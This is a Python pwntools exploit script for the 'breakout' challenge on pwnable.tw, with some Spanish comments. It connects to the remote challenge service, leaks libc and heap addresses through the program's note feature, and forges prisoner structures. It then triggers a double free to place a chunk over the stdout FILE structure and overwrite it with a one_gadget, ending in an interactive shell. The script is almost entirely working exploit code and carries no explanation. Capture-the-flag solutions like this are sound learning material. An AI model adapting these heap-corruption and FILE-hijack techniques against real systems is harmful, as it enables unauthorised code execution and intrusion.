#!/usr/bin/env python

from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
cn = remote('chall.pwnable.tw',10400)
#cn = process('./breakout', env={'LD_PRELOAD':'./libc_64.so.6'})
elf = ELF('./breakout')
libc = ELF('./libc_64.so.6')
#libc offset 
libc_offset = 0x3C3B78

# Wait for debugger
#pid = util.proc.pidof(cn)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)


def note(cell,size,note): 
    cn.sendline('note')
    cn.recvuntil('Cell: ')
    cn.sendline(str(cell))
    cn.recvuntil('Size: ')
    cn.sendline(str(size))
    cn.recvuntil('Note: ')
    cn.send(note)

def punish(cell):
    cn.sendline('punish')
    cn.recvuntil('Cell: ')
    cn.sendline(str(cell))

def list():
    cn.sendline('list')
    

# libc_leak
cn.recvuntil('> ')
note(5,0x40,"A")
cn.recvuntil('> ')
note(4,0x100,"A")
cn.recvuntil('> ')
note(6,0x40,"A")
cn.recvuntil('> ')
note(4,0x200,"C")
cn.recvuntil('> ')
note(5,0x100,"A")
cn.recvuntil('> ')
list()
cn.recvuntil('Cell: 5')
cn.recvuntil('Note: ')
libc_leak=u64(cn.recv()[0x50:0x58])
libc_main = libc_leak-libc_offset
libc.address=libc_main
binsh=next(libc.search('/bin/sh'))
# this one for ubuntu 16.04
#one_gadget=libc.address + 0xef6c4
# this one for ubuntu 18.10
one_gadget=libc.address + 0xf0567

_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']
_IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']
_IO_2_1_stdin_  = libc.sym['_IO_2_1_stdin_']

struct  = p64(binsh)			# risk      0x00
struct += p64(binsh)			# prisoner  0x08
struct += p64(binsh)			# alias     0x10 
struct += p32(50)			# age 	    0x18
struct += p32(51)			# cell      0x1c
struct += p64(binsh)			# sentence  0x20
struct += p64(0x0)			# note_size 0x28
struct += p64(0)			# note	    0x30
struct += p64(0)			# next struct don't touch

#note in #1:malloc(0x40) 
cn.recvuntil('> ') ################################
punish(0)
cn.recvuntil('> ')
note(1,0x40,struct)
cn.recvuntil('> ')
#list()


# leak  HEAP
#cn.recvuntil('> ')
note(7,0x40,"prueba")
cn.recvuntil('> ')
note(8,0x40,"prueba2")
cn.recvuntil('> ')
note(7,0x80,"mas grande")
cn.recvuntil('> ')
note(8,0x80,"maas grande2")
cn.recvuntil('> ')
note(51,0x40,'\x00')

cn.recvuntil('> ')
list()
cn.recvuntil('Sentence: /bin/sh')
cn.recvuntil('Note: ')
heap_leak=u64(cn.recvn(6)+'\x00\x00')
cn.recvuntil('> ')
print "heap leak: " + hex(heap_leak)
print "libc at :" + hex(libc.address)
print "stdout at: "+ hex(libc.sym['_IO_2_1_stdout_'])
# simulate double free
############################################


struct2  = p64(binsh)			# High      0x00
struct2 += p64(binsh)			# name      0x08
struct2 += p64(binsh)			# alias     0x10 
struct2 += p32(50)			# age 	    0x18
struct2 += p32(51)			# cell      0x1c
struct2 += p64(binsh)			# sentence  0x20
struct2 += p64(0x60)			# note_size 0x28
# for ubuntu 16.04
#struct2 += p64(0x460)			# note_size 0x28
# for ubuntu 18.10
struct2 += p64(heap_leak+0x470) 	# note	    0x30 debe apuntar a note in cell 3
struct2 += p64(0)			# next struct don't touch

#raw_input("fase 1")
note(2,72,"\x00"*3+p64(0)*2+p64(0xffffffff)+p64(0)+p64(one_gadget)+p64(_IO_2_1_stdout_+0x98)+p64(_IO_2_1_stderr_)+p64(_IO_2_1_stdout_)+p64(_IO_2_1_stdin_)) # apunta a la tabla de saltos
cn.recvuntil('> ')

#raw_input("fase 2")
note(3,0x60,"1234567890987654321088887777") 		# A=malloc(0x60)
cn.recvuntil('> ')

#raw_input("fase 3")
note(1,0x40,struct)
note(51,0x60,"note 3")			# B=malloc(0x60)
cn.recvuntil('> ')

#raw_input("fase 4")
note(3,0x100,"note 4")			# free A malloc(0x300)
cn.recvuntil('> ')

#raw_input("fase 5")
note(51,0x100,"H")			# free B malloc(0x300)
cn.recvuntil('> ')

#raw_input("fase 6")
note(1,0x40,struct2)			# change 51 cell
cn.recvuntil('> ')

#raw_input("fase 7")
note(51,0x100,"note 51")		# free A (double free) malloc(0x100)
cn.recvuntil('> ')

#raw_input("fase 8")
note(1,0x40,struct)
note(51,0x60,p64(_IO_2_1_stdout_+0x9d))	# malloc(0x60)
cn.recvuntil('> ')

#raw_input("fase 9")
note(1,0x40,struct)
note(51,0x60,"note 9")			# malloc(0x60)
cn.recvuntil('> ')

#raw_input("fase 10")
note(1,0x40,struct)
note(51,0x60,"note 10")			# malloc(0x60)
cn.recvuntil('> ')

#raw_input("fase 11")
note(2,0x60,"")				# free , malloc(0x60)
cn.recvuntil('> ')

list()

cn.interactive()
